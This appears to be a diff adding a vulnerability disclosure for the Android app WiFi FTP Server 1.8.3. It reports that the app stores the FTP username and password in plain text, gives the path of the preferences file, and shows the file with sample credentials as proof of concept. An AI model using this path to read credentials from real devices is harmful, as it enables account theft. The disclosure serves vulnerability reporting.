@@ -1,0 +1,31 @@
+# Exploit Title: WiFi FTP Server 1.8.3 - Credential Disclosure
+# Date: 2019-04-08
+# Software Link: https://play.google.com/store/apps/details?id=com.medhaapps.wififtpserver&hl=en
+# Version: 1.8.3 Android App
+# Vendor: Medha Apps
+# Exploit Author: Loc Phan Van
+# CVE: N/A
+# Category: Mobile Apps
+# Tested on: Android 8.1
+
+# Description
+# WiFi FTP Server 1.8.3 Insecure Data Storage, the result of storing confidential
+# information insecurely on the system i.e. poor encryption, plain text, 
+# access control issues etc. Attacker can find out username/password of valid user via
+# /data/data/com.medhaapps.wififtpserver/shared_prefs/com.medhaapps.wififtpserver_preferences.xml
+
+# PoC
+
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="pref_mount">0</string>
+    <string name="pref_theme">0</string>
+    <boolean name="pref_show_password" value="true" />
+    <boolean name="perf_ftps" value="false" />
+    <string name="pref_port">2221</string>
+    <boolean name="perf_anon" value="false" />
+    <string name="pref_userid">enderphan</string>
+    <string name="pref_password">P4sswr0d123</string>
+    <string name="pref_ssl_mode">0</string>
+    <boolean name="pref_read_only" value="false" />
+</map>
